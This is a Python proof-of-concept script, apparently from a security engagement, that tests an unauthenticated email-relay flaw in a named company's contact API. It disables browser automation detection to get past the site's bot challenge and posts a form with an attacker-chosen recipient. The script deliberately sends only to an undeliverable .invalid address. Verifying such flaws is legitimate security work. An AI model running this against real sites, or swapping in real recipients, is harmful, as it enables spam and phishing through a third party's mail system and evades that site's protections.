#!/usr/bin/env python3
"""Independent verification of unauthenticated email relay at POST /api/send
Target: https://www.infinitycapital.bh/api/send (in scope)
Uses a real Chromium (playwright) so any Vercel bot-challenge JS is executed
like a normal visitor. Only ONE message is sent, to a role-based .invalid
address (RFC 2606) that can never receive mail -> not spam, not a real victim.
"""
import json, sys, time, pathlib
from playwright.sync_api import sync_playwright

TARGET = "https://www.infinitycapital.bh/contact"
API    = "https://www.infinitycapital.bh/api/send"
TAG    = sys.argv[1] if len(sys.argv) > 1 else "A"
# RFC 2606 reserved TLD -> guaranteed undeliverable, no third party is spammed
RECIP  = f"relay-verify-{TAG}-2026@verifier-probe.invalid"

out = pathlib.Path("/work/evidence")
out.mkdir(parents=True, exist_ok=True)
res = {"tag": TAG, "recipient": RECIP}

with sync_playwright() as p:
    br = p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
    ctx = br.new_context(
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        locale="en-US", timezone_id="Asia/Bahrain", viewport={"width":1440,"height":900})
    pg = ctx.new_page()

    # observe whether the edge challenge page is served and then cleared
    pg.on("response", lambda r: res.setdefault("responses", []).append(
        f"{r.status} {r.url[:120]}" ) if "/api/" in r.url or "challenge" in (r.headers.get("x-vercel-mitigated") or "") else None)

    resp = pg.goto(TARGET, wait_until="domcontentloaded", timeout=90000)
    res["contact_page_status"] = resp.status if resp else None
    res["contact_title"] = pg.title()
    time.sleep(12)   # allow the Vercel checkpoint JS to run / auto-reload
    res["title_after_wait"] = pg.title()
    res["url_after_wait"] = pg.url
    pg.screenshot(path=str(out / f"pw_{TAG}_contact.png"), full_page=False)

    # Check for CSRF-ish tokens the site might require (evidence of control, if any)
    try:
        res["page_has_recaptcha"] = pg.evaluate("!!document.querySelector('.g-recaptcha, [data-sitekey], iframe[src*=recaptcha]')")
    except Exception as e:
        res["page_has_recaptcha"] = f"err {e}"

    # 1) direct API call from the browser context (fetch, FormData) - NO auth, no CSRF header
    js = """
    async ([api, rec]) => {
      const fd = new FormData();
      fd.append('fname','Security');
      fd.append('lname','Verification');
      fd.append('areacode','+973');
      fd.append('tel','00000000');
      fd.append('cname','Independent Security Audit');
      fd.append('subject','Authorized authorized security verification ' + rec);
      fd.append('msg','Automated authorized security verification of a public contact endpoint. No reply expected.');
      fd.append('check','');          // honeypot present-but-empty (bot-style)
      fd.append('targets', rec);      // <-- attacker controlled recipient
      const t0 = Date.now();
      const r = await fetch(api, {method:'POST', body: fd, credentials:'omit'});
      const txt = await r.text();
      return {status: r.status, ms: Date.now()-t0,
              ct: r.headers.get('content-type'),
              body: txt.slice(0,800),
              sent_body: fd.get('targets')};
    }
    """
    r = pg.evaluate(js, [API, RECIP])
    res["relay_attempt"] = r
    print(json.dumps(res, indent=2)[:4000])
    (out / f"pw_{TAG}_result.json").write_text(json.dumps(res, indent=2))

    # 2) Confirm the SAME endpoint rejects/handles a missing target (i.e. targets is
    #    really the recipient, not a no-op) - one extra call, non-delivering
    js2 = """
    async (api) => {
      const fd = new FormData();
      fd.append('fname','Security'); fd.append('msg','test'); fd.append('check','');
      const r = await fetch(api, {method:'POST', body: fd, credentials:'omit'});
      return {status: r.status, body: (await r.text()).slice(0,500)};
    }
    """
    res["no_targets_attempt"] = pg.evaluate(js2, API)
    (out / f"pw_{TAG}_result.json").write_text(json.dumps(res, indent=2))
    print(json.dumps(res["no_targets_attempt"], indent=2))
    br.close()
